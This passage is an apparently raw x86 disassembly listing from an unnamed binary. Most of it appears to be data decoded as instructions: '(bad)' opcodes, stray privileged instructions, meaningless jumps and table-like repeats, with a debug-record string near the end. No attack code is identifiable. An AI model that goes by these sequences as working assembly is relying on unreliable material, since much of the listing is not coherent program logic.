  43332a:	or     eax,0x4b7284
  43332f:	xor    al,cl
  433331:	mov    ecx,DWORD PTR [ebp-0x20]
  433334:	mov    ecx,DWORD PTR [ecx]
  433336:	xor    ecx,edi
  433338:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43333f:	xor    cl,al
  433341:	mov    ecx,DWORD PTR [edi]
  433343:	fadd   QWORD PTR [ebp+0x9]
  433346:	call   0xffd02e1a
  43334b:	dec    ebx
  43334c:	dec    ebp
  43334d:	xor    bh,BYTE PTR [ebx]
  43334f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433353:	loopne 0x433351
  433355:	or     edi,eax
  433357:	iret   
  433358:	ret    
  433359:	mov    WORD PTR [ebp+0x4f],es
  43335c:	mov    esi,DWORD PTR [edx]
  43335e:	call   0x8452fa9d
  433363:	(bad)  
  433364:	fwait
  433365:	add    BYTE PTR [edx],dh
  433367:	mov    esi,DWORD PTR [ebx]
  433369:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43336f:	test   BYTE PTR [ebx],dh
  433371:	dec    ebx
  433372:	add    esi,DWORD PTR [edx]
  433374:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43337a:	dec    edi
  43337c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  433383:	xor    al,BYTE PTR [ebx]
  433385:	mov    edi,DWORD PTR [ebx]
  433387:	in     al,0x75
  433389:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43338f:	dec    ebx
  433390:	xor    esi,DWORD PTR [edx]
  433392:	lea    ecx,[edx]
  433394:	or     BYTE PTR [ebx+0x900f072],cl
  43339a:	ja     0x43336b
  43339c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  4333a3:	cmp    ch,al
  4333a5:	jne    0x43339a
  4333a7:	mov    edi,edi
  4333a9:	fadd   QWORD PTR [ebp+0x0]
  4333ac:	mov    eax,edi
  4333ae:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4333b5:	mov    edx,DWORD PTR [ebx]
  4333b7:	in     al,0x45
  4333b9:	or     DWORD PTR [ebx],esi
  4333bb:	iret   
  4333bc:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4333c3:	xor    dl,BYTE PTR [eax-0x75]
  4333c6:	sbb    al,0xe0
  4333c8:	dec    DWORD PTR [ecx]
  4333ca:	mov    ecx,edi
  4333cc:	in     al,dx
  4333cd:	mov    eax,es
  4333cf:	dec    ebx
  4333d0:	mov    DWORD PTR [edx],esi
  4333d2:	fmul   QWORD PTR [edx]
  4333d4:	jne    0x433361
  4333d6:	(bad)  
  4333d7:	(bad)  
  4333d9:	or     DWORD PTR [ebp-0x31],eax
  4333dc:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4333e3:	cmp    bh,bh
  4333e5:	jne    0x43342c
  4333e7:	lea    ecx,[ebx-0x38372750]
  4333ed:	inc    ebx
  4333ef:	mov    eax,ecx
  4333f1:	mov    eax,0xa00c111
  4333f6:	jne    0x43343d
  4333f8:	mov    esi,DWORD PTR [ebx]
  4333fa:	test   al,0x3
  4333fc:	inc    ebp
  4333fd:	mov    DWORD PTR [eax-0xc],edx
  433400:	loop   0x433447
  433402:	push   DWORD PTR [ebx]
  433404:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43340a:	add    DWORD PTR [eax],eax
  43340c:	mov    eax,edi
  43340e:	lods   al,BYTE PTR ds:[esi]
  43340f:	dec    ebp
  433410:	inc    ebp
  433411:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433417:	retf   
  433418:	mov    edx,ecx
  43341a:	adc    al,0x84
  43341c:	(bad)  
  43341d:	std    
  43341e:	ret    
  43341f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433425:	hlt    
  433426:	rol    edi,0x82
  433429:	ret    
  43342a:	cld    
  43342b:	enter  0x11ff,0x45
  43342f:	inc    ebp
  433430:	pop    edi
  433431:	mov    ebx,DWORD PTR [ebx+0x14]
  433434:	ret    0xc7
  433437:	test   BYTE PTR [ebx+0x4532519b],cl
  43343d:	jmp    0x4333ca
  43343f:	push   0x8
  433441:	call   DWORD PTR [esi]
  433443:	in     al,dx
  433444:	add    BYTE PTR [ebp+0x1],0x50
  433448:	add    bh,ah
  43344a:	add    bh,bh
  43344c:	icebp  
  43344d:	mov    ecx,DWORD PTR [eax]
  43344f:	cld    
  433450:	pop    es
  433451:	dec    ebp
  433452:	shl    DWORD PTR [ebx],0x72
  433455:	add    eax,DWORD PTR [eax]
  433457:	cmp    edx,ecx
  433459:	je     0x43346b
  43345b:	mov    esi,DWORD PTR [ebp-0x4]
  43345e:	inc    edi
  433460:	or     al,0xc3
  433462:	jmp    FWORD PTR [edx-0x18]
  433465:	(bad)  
  433466:	sti    
  433467:	cwde   
  433468:	(bad)  
  433469:	call   0xffa12d74
  43346e:	or     al,0x45
  433470:	push   ebp
  433471:	sub    esp,0x18
  433474:	push   ebx
  433475:	inc    ebp
  433476:	mov    edi,edi
  433478:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43347f:	test   al,0x54
  433481:	inc    ebp
  433482:	push   ecx
  433483:	push   eax
  433484:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43348a:	add    ah,bh
  43348c:	(bad)  
  43348d:	dec    ebp
  43348e:	add    DWORD PTR [ebx],esi
  433490:	inc    ebp
  433491:	add    ecx,DWORD PTR [ebx+0x74943b]
  433497:	push   0xffffff8b
  433499:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43349f:	add    eax,DWORD PTR [ecx]
  4334a1:	or     BYTE PTR [eax],al
  4334a3:	call   0xff852ca8
  4334a8:	mov    eax,DWORD PTR [ebp+0x14]
  4334ab:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4334b1:	inc    ebp
  4334b2:	dec    ecx
  4334b3:	add    ebp,DWORD PTR [edx+0x14]
  4334b6:	push   0x8b3045
  4334bb:	call   0x33ad8230
  4334c0:	inc    DWORD PTR [ebx]
  4334c2:	mov    DWORD PTR [edi],ecx
  4334c4:	mov    eax,ecx
  4334c6:	or     BYTE PTR [ebp-0x3d],cl
  4334c9:	cmp    eax,edi
  4334cb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4334d0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4334d6:	adc    al,0xc9
  4334d8:	inc    ebp
  4334d9:	adc    BYTE PTR [eax+0x55],dl
  4334dc:	jne    0x4334ca
  4334de:	call   0xff54346e
  4334e3:	dec    ebp
  4334e4:	inc    ebp
  4334e5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4334eb:	add    BYTE PTR [ebx],bh
  4334ed:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4334f1:	push   esp
  4334f2:	or     al,0x51
  4334f4:	dec    ebp
  4334f5:	xor    DWORD PTR [ebx],0xf32039b
  4334fb:	cmp    eax,DWORD PTR [ebp+0x74]
  4334fe:	mov    edi,edi
  433500:	pop    edi
  433501:	adc    BYTE PTR [ebx+0x75],bl
  433504:	ret    0x50
  433507:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43350b:	(bad)  
  43350c:	clc    
  43350d:	mov    esp,ebp
  43350f:	pop    ecx
  433510:	mov    ecx,0xf80085c2
  433515:	mov    ecx,DWORD PTR [ecx+edx*2]
  433518:	push   esi
  433519:	push   esi
  43351a:	(bad)  
  43351b:	lock add DWORD PTR [ebp+0x44],eax
  43351f:	mov    edx,DWORD PTR [eax]
  433521:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433525:	or     BYTE PTR [edi+eax*1+0x51],dl
  433529:	ret    
  43352a:	xor    ebx,DWORD PTR [ebx+0x37232be]
  433530:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433536:	or     al,0x80
  433538:	jge    0x43353b
  43353a:	mov    DWORD PTR [eax],eax
  43353c:	and    al,0x8
  43353e:	cmp    DWORD PTR [ebp+0x10],eax
  433541:	mov    edx,DWORD PTR [esi]
  433543:	xchg   esp,eax
  433544:	dec    esp
  433545:	add    BYTE PTR [eax],dl
  433547:	mov    ecx,edx
  433549:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43354d:	dec    ebp
  43354e:	into   
  43354f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433555:	mov    edx,DWORD PTR [eax+0x14]
  433558:	das    
  433559:	add    al,0x45
  43355b:	add    BYTE PTR [ebp+0x0],dh
  43355e:	mov    edi,edi
  433560:	and    al,0x50
  433562:	mov    eax,DWORD PTR [eax]
  433564:	and    al,0xd1
  433566:	xor    eax,DWORD PTR [esi]
  433568:	lea    eax,[ebp+0x8]
  43356b:	xor    esi,DWORD PTR [edx+0x3]
  43356e:	add    BYTE PTR [ecx+0x4510fc44],cl
  433574:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  43357a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433584:	cmp    al,0xff
  433586:	pushf  
  433587:	mov    edi,edi
  433589:	or     BYTE PTR [esi+ecx*1],cl
  43358c:	jne    0x433551
  43358e:	call   0xc355a
  433593:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433597:	mov    ebx,DWORD PTR [eax]
  433599:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43359d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4335a5:	pop    esi
  4335a6:	and    al,0xc9
  4335a8:	call   DWORD PTR [eax]
  4335aa:	and    al,0x55
  4335ac:	call   0x28349d
  4335b1:	add    DWORD PTR [eax+edx*1+0xc],0x31
  4335b6:	clc    
  4335b7:	pushf  
  4335b8:	dec    DWORD PTR [ecx+0x57892474]
  4335be:	jmp    0x433601
  4335c0:	and    al,0x89
  4335c2:	and    al,0x24
  4335c4:	or     BYTE PTR [ebx-0x45ebdbe8],cl
  4335ca:	dec    DWORD PTR [eax]
  4335cc:	and    al,0x7
  4335ce:	pop    esi
  4335cf:	cli    
  4335d0:	in     eax,0x9b
  4335d2:	ret    0x32
  4335d5:	add    eax,edx
  4335d7:	mov    DWORD PTR [ebx+0x688b8924],ebx
  4335dd:	or     al,0xf8
  4335df:	jl     0x43365e
  4335e1:	adc    al,0x9c
  4335e3:	dec    ebp
  4335e4:	push   0xff8b7575
  4335e9:	and    al,0xff
  4335eb:	xor    edi,edi
  4335ed:	mov    esi,DWORD PTR [esp-0x75]
  4335f1:	add    ecx,DWORD PTR [ebx+0x4cca0c0f]
  4335f7:	or     bl,ch
  4335f9:	cmp    DWORD PTR [eax],edx
  4335fb:	sbb    al,0x44
  4335fd:	or     BYTE PTR [eax+edx*1-0x7c],cl
  433601:	xor    ah,BYTE PTR [eax*4-0x7a8accf2]
  433608:	or     BYTE PTR [ecx*4+0x5d5fbf74],ah
  43360f:	test   eax,0x83001010
  433614:	dec    eax
  433615:	adc    BYTE PTR [eax],al
  433617:	adc    edi,DWORD PTR [edx+0x10]
  43361a:	add    cl,bh
  43361c:	jae    0x43362e
  43361e:	add    BYTE PTR [ebx-0x4bffefb4],dh
  433624:	pop    eax
  433625:	adc    BYTE PTR [eax],al
  433627:	fidiv  DWORD PTR [ebp+0x10]
  43362a:	add    dh,bl
  43362c:	movups xmm0,XMMWORD PTR [eax]
  43362f:	popf   
  433630:	push   cs
  433631:	adc    BYTE PTR [eax],al
  433633:	ins    DWORD PTR es:[edi],dx
  433634:	or     BYTE PTR [eax],dl
  433636:	add    BYTE PTR [ebx+eiz*2+0x360f0010],cl
  43363d:	inc    ebx
  43363e:	add    BYTE PTR [ebx],dl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [edi],dl
  433644:	ss inc ebx
  433646:	add    BYTE PTR [ebx],bl
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [edi],bl
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [ebx],ah
  433650:	ss inc ebx
  433652:	add    BYTE PTR [edi],ah
  433654:	ss inc ebx
  433656:	add    BYTE PTR [ebx],ch
  433658:	ss inc ebx
  43365a:	add    BYTE PTR [edi],ch
  43365c:	ss inc ebx
  43365e:	add    BYTE PTR [ebx],dh
  433660:	ss inc ebx
  433662:	add    BYTE PTR [edi],dh
  433664:	ss inc ebx
  433666:	add    BYTE PTR [ebx-0x73ffefdd],bh
  43366c:	cmp    al,0x10
  43366e:	add    BYTE PTR [ebx+0x30],cl
  433671:	adc    BYTE PTR [eax],al
  433673:	sub    al,0xc
  433675:	adc    BYTE PTR [eax],al
  433677:	push   ds
  433678:	adc    BYTE PTR ds:[eax],al
  43367b:	mov    bh,0x56
  43367d:	adc    BYTE PTR [eax],al
  43367f:	adc    eax,DWORD PTR [eax+edx*1+0x0]
  433683:	cmp    al,0x4f
  433685:	adc    BYTE PTR [eax],al
  433687:	addr16 ss inc ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    BYTE PTR [ebx+0x36],dh
  433695:	inc    ebx
  433696:	add    BYTE PTR [edi+0x36],dh
  433699:	inc    ebx
  43369a:	add    BYTE PTR [ebx+0x36],bh
  43369d:	inc    ebx
  43369e:	add    BYTE PTR [edi+0x36],bh
  4336a1:	inc    ebx
  4336a2:	add    BYTE PTR [ebx-0x23ffbcca],al
  4336a8:	pop    esp
  4336a9:	adc    BYTE PTR [eax],al
  4336ab:	jle    0x4336cd
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	cld    
  4336b0:	dec    edx
  4336b1:	adc    BYTE PTR [eax],al
  4336b3:	add    al,0xb
  4336b5:	adc    BYTE PTR [eax],al
  4336b7:	push   ebx
  4336b8:	ins    DWORD PTR es:[edi],dx
  4336b9:	adc    BYTE PTR [eax],al
  4336bb:	fs jl  0x4336ce
  4336be:	add    BYTE PTR [edx+0x42001015],ah
  4336c4:	jge    0x4336d6
  4336c6:	add    BYTE PTR [edi-0x54ffbcca],ah
  4336cc:	ss inc ebx
  4336ce:	add    BYTE PTR [edi-0x4cffbcca],ch
  4336d4:	ss inc ebx
  4336d6:	add    BYTE PTR [edi-0x44ffbcca],dh
  4336dc:	ss inc ebx
  4336de:	add    BYTE PTR [edi-0x3cffbcca],bh
  4336e4:	ss inc ebx
  4336e6:	add    BYTE PTR [edi+0x2300103a],ah
  4336ec:	aas    
  4336ed:	adc    BYTE PTR [eax],al
  4336ef:	jne    0x4336fc
  4336f1:	adc    BYTE PTR [eax],al
  4336f3:	fldenv [esi]
  4336f5:	adc    BYTE PTR [eax],al
  4336f7:	xchg   esp,eax
  4336f8:	push   0x10
  4336fa:	add    bl,ah
  4336fc:	pop    eax
  4336fd:	adc    BYTE PTR [eax],al
  4336ff:	in     al,0x2f
  433701:	adc    BYTE PTR [eax],al
  433703:	leave  
  433704:	sbb    DWORD PTR [eax],edx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    bl,dh
  433714:	ss inc ebx
  433716:	add    bh,dh
  433718:	ss inc ebx
  43371a:	add    bl,bh
  43371c:	ss inc ebx
  43371e:	add    bh,bh
  433720:	ss inc ebx
  433722:	add    BYTE PTR [ebx],al
  433724:	aaa    
  433725:	inc    ebx
  433726:	add    BYTE PTR [ebp+0x1d001062],bh
  43372c:	adc    BYTE PTR [eax],dl
  43372e:	add    BYTE PTR [edi+0x51],dl
  433731:	adc    BYTE PTR [eax],al
  433733:	dec    eax
  433734:	ins    DWORD PTR es:[edi],dx
  433735:	adc    BYTE PTR [eax],al
  433737:	mov    eax,DWORD PTR [edi]
  433739:	adc    BYTE PTR [eax],al
  43373b:	mov    ah,0x7
  43373d:	adc    BYTE PTR [eax],al
  43373f:	ror    DWORD PTR [esi],1
  433741:	adc    BYTE PTR [eax],al
  433743:	pop    edi
  433744:	inc    ebp
  433745:	adc    BYTE PTR [eax],al
  433747:	daa    
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [ebx],dh
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [edi],dh
  433758:	aaa    
  433759:	inc    ebx
  43375a:	add    BYTE PTR [ebx],bh
  43375c:	aaa    
  43375d:	inc    ebx
  43375e:	add    BYTE PTR [edi],bh
  433760:	aaa    
  433761:	inc    ebx
  433762:	add    BYTE PTR [ebx+0x37],al
  433765:	inc    ebx
  433766:	add    BYTE PTR [ecx+0x36],cl
  433769:	push   eax
  43376a:	pop    edi
  43376b:	ss inc ebx
  43376d:	ss pop edx
  43376f:	xor    ebx,DWORD PTR [edi+0x52]
  433772:	add    BYTE PTR [edi+ecx*2+0x32],dl
  433776:	pop    edi
  433777:	dec    esi
  433778:	dec    esp
  433779:	dec    eax
  43377a:	xor    esi,DWORD PTR [edx]
  43377c:	pop    edi
  43377d:	xor    al,0x4b
  43377f:	add    BYTE PTR [eax+0x49],cl
  433782:	push   ebp
  433783:	xor    al,0x5f
  433785:	dec    esp
  433786:	inc    edx
  433787:	dec    ecx
  433788:	cmp    DWORD PTR [edi+ebx*2],esi
  43378b:	pop    ecx
  43378c:	inc    edi
  43378d:	add    BYTE PTR [eax+0x50],bl
  433790:	dec    eax
  433791:	pop    edi
  433792:	push   ebp
  433793:	push   ecx
  433794:	inc    edi
  433795:	xor    cl,BYTE PTR [edx+0x38]
  433798:	push   esi
  433799:	add    BYTE PTR [ebx+0x4a],al
  43379c:	push   edx
  43379d:	pop    edi
  43379e:	dec    edi
  43379f:	dec    eax
  4337a0:	dec    edi
  4337a1:	dec    edi
  4337a2:	dec    edx
  4337a3:	add    BYTE PTR [ecx+0x52],al
  4337a6:	cmp    DWORD PTR [edi+0x56],ebx
  4337a9:	aaa    
  4337aa:	dec    esp
  4337ab:	cmp    DWORD PTR [ebx+0x5f],eax
  4337ae:	push   edx
  4337af:	inc    esp
  4337b0:	add    BYTE PTR [ecx+0x37],bl
  4337b3:	inc    esp
  4337b4:	pop    edi
  4337b5:	dec    ecx
  4337b6:	xor    esi,DWORD PTR [edi]
  4337b8:	xor    DWORD PTR [edi+0x49],ebx
  4337bb:	push   esp
  4337bc:	xor    eax,DWORD PTR [eax]
  4337be:	push   edx
  4337bf:	xor    BYTE PTR [eax+0x5f],bl
  4337c2:	dec    eax
  4337c3:	push   edi
  4337c4:	inc    esi
  4337c5:	xor    DWORD PTR [edi+0x5f],edx
  4337c8:	cmp    BYTE PTR [ebx+0x37],dl
  4337cb:	add    BYTE PTR [esi+0x42],dl
  4337ce:	dec    ecx
  4337cf:	xor    ebx,DWORD PTR [edi+0x45]
  4337d2:	xor    BYTE PTR [ebp+0x5f],cl
  4337d5:	xor    al,0x34
  4337d7:	xor    BYTE PTR [edx+0x5f],cl
  4337da:	inc    edi
  4337db:	add    BYTE PTR [edx+0x57],dl
  4337de:	xor    ebx,DWORD PTR [edi+0x31]
  4337e1:	dec    edx
  4337e2:	push   edi
  4337e3:	xor    eax,0x4d435f
  4337e8:	dec    ecx
  4337e9:	xor    eax,0x36365f39
  4337ee:	dec    eax
  4337ef:	xor    BYTE PTR [eax],al
  4337f1:	dec    edi
  4337f2:	inc    ebx
  4337f3:	push   edi
  4337f4:	pop    edi
  4337f5:	inc    edi
  4337f6:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  4337fb:	add    BYTE PTR [edx+0x0],al
  4337fe:	pop    eax
  4337ff:	add    BYTE PTR [edi+0x0],al
  433802:	add    BYTE PTR ss:[edi+0x0],bl
  433806:	push   esi
  433807:	add    BYTE PTR [ebx+0x0],al
  43380a:	dec    esi
  43380b:	add    BYTE PTR [eax+eax*1+0x0],al
  43380f:	add    BYTE PTR [edi+0x0],cl
  433812:	dec    ebp
  433813:	add    BYTE PTR [edi+0x0],al
  433816:	xor    eax,DWORD PTR [eax]
  433818:	pop    edi
  433819:	add    BYTE PTR [eax+eax*1],dh
  43381c:	dec    esi
  43381d:	add    BYTE PTR [edx+0x0],bl
  433820:	cmp    BYTE PTR [eax],al
  433822:	pop    edi
  433823:	add    BYTE PTR [eax+0x0],bl
  433826:	cmp    BYTE PTR [eax],al
  433828:	add    BYTE PTR [eax],al
  43382a:	push   edx
  43382b:	add    BYTE PTR [eax+0x0],bl
  43382e:	push   ecx
  43382f:	add    BYTE PTR [edi+0x0],bl
  433832:	dec    esp
  433833:	add    BYTE PTR [edx+0x0],dl
  433836:	dec    ecx
  433837:	add    BYTE PTR [edi+0x0],cl
  43383a:	inc    esp
  43383b:	add    BYTE PTR [edi+0x0],bl
  43383e:	dec    edi
  43383f:	add    BYTE PTR [ebx],dh
  433841:	add    BYTE PTR [eax+eax*1+0x0],al
  433845:	add    BYTE PTR [ebx+0x0],al
  433848:	push   eax
  433849:	add    BYTE PTR [ebp+0x0],al
  43384c:	pop    edi
  43384d:	add    BYTE PTR ds:0x39004500,dh
  433853:	add    BYTE PTR [edi+0x0],bl
  433856:	push   esi
  433857:	add    BYTE PTR [eax],al
  433859:	add    BYTE PTR [edi+0x0],al
  43385c:	dec    esi
  43385d:	add    BYTE PTR [esi+0x0],dl
  433860:	pop    edi
  433861:	add    BYTE PTR [edi+0x0],al
  433864:	push   esp
  433865:	add    BYTE PTR [eax+0x0],cl
  433868:	xor    al,BYTE PTR [eax]
  43386a:	xor    DWORD PTR [eax],eax
  43386c:	pop    edi
  43386d:	add    BYTE PTR [edi+0x0],cl
  433870:	add    BYTE PTR ss:[ebx],dh
  433873:	add    BYTE PTR [eax],al
  433875:	add    BYTE PTR [eax+eax*1+0x45],al
  433879:	add    BYTE PTR [ecx+0x0],cl
  43387c:	pop    edi
  43387d:	add    BYTE PTR [edx+0x0],dl
  433880:	dec    eax
  433881:	add    BYTE PTR [eax+eax*1],dh
  433884:	dec    eax
  433885:	add    BYTE PTR [eax],al
  433887:	add    BYTE PTR [eax],al
  433889:	push   edx
  43388a:	push   ebx
  43388b:	inc    esp
  43388c:	push   ebx
  43388d:	aam    0xe8
  43388f:	cwde   
  433890:	adc    DWORD PTR [edx+0x4b],0x26
  433894:	inc    esp
  433895:	xchg   BYTE PTR [ebx+0x1b1914b0],ah
  43389b:	mov    ebp,0xe1c
  4338a0:	add    BYTE PTR [ecx+0x3a],dl
  4338a3:	pop    esp
  4338a4:	js     0x4338fe
  4338a6:	ins    DWORD PTR es:[edi],dx
  4338a7:	arpl   WORD PTR [esi+0x76],sp
  4338aa:	addr16 jp 0x433921
  4338ad:	pop    esp
  4338ae:	inc    ebp
  4338af:	inc    esi
  4338b0:	dec    edx
  4338b1:	bound  ebp,QWORD PTR [edx+0x67]
  4338b4:	popa   
  4338b5:	push   0x6c776a5c
  4338ba:	bound  esp,QWORD PTR [eax+ebp*2+0x70]
  4338be:	popa   
  4338bf:	bound  esi,QWORD PTR [edi+0x65]
  4338c2:	cs jo  0x433929
  4338c5:	bound  eax,QWORD PTR [eax]
	...
